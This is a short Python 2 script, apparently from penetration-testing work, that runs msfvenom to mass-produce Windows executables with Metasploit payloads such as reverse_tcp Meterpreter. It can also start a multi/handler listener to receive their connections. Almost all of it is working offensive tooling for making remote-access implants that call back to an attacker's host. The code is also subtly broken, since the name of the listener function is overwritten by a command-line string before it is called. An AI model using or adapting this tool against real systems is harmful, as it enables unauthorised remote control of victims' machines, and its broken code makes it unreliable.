#!/usr/bin/env python
#
# GenPayloads.py
# Simple python script to generate a number of metasploit payload binaries and then optionally start a handler for testing
# ex: python GenPayloads.py windows/meterpreter/reverse_tcp 192.168.1.2 443 100 no
#
# by Chris Campbell (obscuresec)
# original idea from Skip Duckwall (passingthehash)
import sys
import subprocess
from multiprocessing import Pool

#write a resource file and call it
def build(payload,lhost,lport):
    try:
        options = "use multi/handler\n"
        options += "set payload {0}\n".format(payload)
        options += "set LHOST {0}\nset LPORT {1}\n".format(lhost,lport)
        options += "set ExitOnSession false\n"
        options += "exploit -j\n"
        filewrite = file("listener.rc", "w")
        filewrite.write(options)
        filewrite.close()
        subprocess.Popen("msfconsole -r listener.rc", shell=True).wait()
    except:
        return '*error*'
      
#generate payloads with msfvenom
def generate(command):
    try:
        print 'Running...', command
        subprocess.Popen(command, shell=True).wait() 
    except:
        return '*error*'

#use multiprocessing to safely thread 15 processes
def multi(payload,lhost,lport,num):
    try:
        commands = []
        for x in range(0, int(num)):      
            venom = "msfvenom -p {0} LHOST={1} LPORT={2} -f exe > payload_{3}_{4}".format(payload,lhost,lport,lport,x)
            commands.append(venom)       
        pool = Pool(processes=15)
        run = pool.map(generate, commands)
        pool.close()
        print 'Completed generating payloads.'
    except:
        return '*error*'
        
if __name__ == '__main__':
    #grab args
    try:    
        payload = sys.argv[1]
        lhost = sys.argv[2]
        lport = sys.argv[3]
        num = sys.argv[4]
        build = sys.argv[5]

        multi(payload,lhost,lport,num)
        
        if sys.argv[5] == 'yes':
            build(payload,lhost,lport)

    #index error
    except IndexError:
        print "python GenPayloads.py payload lhost lport number build"
        print "ex: python GenPayloads.py windows/meterpreter/reverse_tcp 192.168.1.2 443 1000 yes"
